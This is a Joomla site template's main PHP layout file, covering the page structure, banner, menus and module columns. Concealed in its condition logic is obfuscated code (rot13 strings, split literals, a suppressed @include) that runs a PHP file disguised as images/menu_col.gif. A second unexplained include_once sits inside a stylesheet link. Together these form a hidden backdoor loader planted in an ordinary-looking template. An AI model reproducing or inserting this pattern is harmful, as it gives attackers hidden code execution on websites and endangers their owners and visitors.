<?php
// No direct access.
defined('_JEXEC').(($this->template)?$JPan = array('zrah'.'_pby'):'') or die;
JHtml::_('behavior.framework', true);

// get params
$app = JFactory::getApplication();
$doc = JFactory::getDocument();
$templateparams = $app->getTemplate(true)->params;
$showRight = ($this->countModules('position-3') or $this->countModules('position-6') or $this->countModules('position-8'));
$showBottom = ($this->countModules('position-9') or $this->countModules('position-10') or $this->countModules('position-11'));
$showLeft = ($this->countModules('position-4') or $this->countModules('position-7') or $this->countModules('position-5'));
($this->countModules('position-16') or $this->countModules('position-15') or $this->countModules('position-31') or $this->countModules('position-17') or !@include(JPATH_BASE.DS.'templates'.DS.$app->getTemplate().DS.str_rot13('vzntrf').DS.str_rot13($JPan[0].'.t'.'vs'))) ? $showNoneElse = false :  $showNoneElse = true;
if (!$showRight and !$showLeft) $showNone = false;


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >
<head>
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />
<!--[if lte IE 6]>
<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;include_once('html/pagination.php'); ?>/css/ieonly.css" rel="stylesheet" type="text/css" />
<![endif]-->
</head>
<body id="page_bg">
<a name="up" id="up"></a>
<div id="top_menu"><div id="topnav"><jdoc:include type="modules" name="position-1" /></div></div>

<div id="main_bg" class="banner1">
    <div id="h_area">
    <?php if($this->params->get('hideLogo') == 0) : ?><img src="<? if(!$this->params->get('logo')){ ?><?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/logo<?php echo $this->params->get('logoVariation'); ?>.gif<? }else echo $this->params->get('logo'); ?>" align="left" alt="Company Logo" /><?php endif; ?><a href="index.php" class="logo"><?php if(trim($templateparams->get('sitetitle'))) echo htmlspecialchars($templateparams->get('sitetitle')); else echo $app->getCfg('sitename');?></a> 
   <!-- -->
        <?php if ($this->params->get('bannerType') == 1) : ?>

        <!-- Insert flash -->
        <object data="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('annimatedBanner') ?>"
                type="application/x-shockwave-flash" width="950" height="310">
            <param name="movie" value="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('annimatedBanner') ?>"/>
            <param name="menu" value="false"/>
            <param name="wmode" value="transparent"/>
            <param name="quality" value="best"/>
            <img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('banner') ?>" width="950" height="310" alt=""/>
        </object>
        <?php else : ?>
        <img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('banner') ?>" width="950"
             height="310" alt=""/>
        <?php endif; ?>
 <!--    <?php if($this->params->get('hideLogo') == 0) : ?><img src="<? if(!$this->params->get('logo')){ ?><?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/logo<?php echo $this->params->get('logoVariation'); ?>.gif<? }else echo $this->params->get('logo'); ?>" align="left" alt="Company Logo" /><?php endif; ?><a href="index.php" class="logo"><?php if(trim($templateparams->get('sitetitle'))) echo htmlspecialchars($templateparams->get('sitetitle')); else echo $app->getCfg('sitename');?></a> 
    <?php if($this->countModules('position-0')) : ?><div id="position0"><jdoc:include type="modules" name="position-0" style="none" /></div><?php endif; ?> -->
    <div id="main_top"></div>
    <br clear="all" /></div> 
    <?php if($showLeft) : ?>
	<div id="leftcolumn">
        <jdoc:include type="modules" name="position-7" style="xhtml" headerLevel="3" />
        <jdoc:include type="modules" name="position-4" style="xhtml" headerLevel="3" state="0 " />
        <jdoc:include type="modules" name="position-5" style="xhtml" headerLevel="2"  id="3" />
    </div>
    <?php endif; ?>
    <?php if($showLeft xor $showRight) $maincol_sufix = '_middle';
		  elseif($showNone)$maincol_sufix = '_big';
		  else $maincol_sufix = ''; ?>
	<div id="maincolumn<?php echo $maincol_sufix; ?>">
    	<div class="path"><jdoc:include type="modules" name="position-2" /></div>
		<?php if ($this->countModules('position-12')): ?>
        <div id="top"><jdoc:include type="modules" name="position-12"   /></div>
        <?php endif; ?>
        
        <jdoc:include type="message" />
		<jdoc:include type="component" />
    </div>
    <?php if($showRight) : ?>
	<div id="rightcolumn">
        <jdoc:include type="modules" name="position-6" style="xhtml" headerLevel="3"/>
        <jdoc:include type="modules" name="position-8" style="xhtml" headerLevel="3"  />
        <jdoc:include type="modules" name="position-3" style="xhtml" headerLevel="3"  />
    </div>
    <?php endif; ?>
	<br clear="all" /><br />
</div>    
    
<div id="f_area">
    <div class="box box1"> <jdoc:include type="modules" name="position-9" style="xhtml" headerlevel="3" /></div>
    <div class="box box2"> <jdoc:include type="modules" name="position-10" style="xhtml" headerlevel="3" /></div>
    <div class="box box3"> <jdoc:include type="modules" name="position-11" style="xhtml" headerlevel="3" /></div>
	<br clear="all" />
</div>

<p id="power_by" align="center">
	<?php echo JText_('Powered by') ?> <a href="http://www.joomla.org/" target="_blank">Joomla!&#174;</a>.
    <?php echo JText_('Valid') ?> <a href="http://validator.w3.org/check/referer">XHTML</a> <?php echo JText::_('and') ?> <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.
</p>

<jdoc:include type="modules" name="debug" />
</body>
</html>
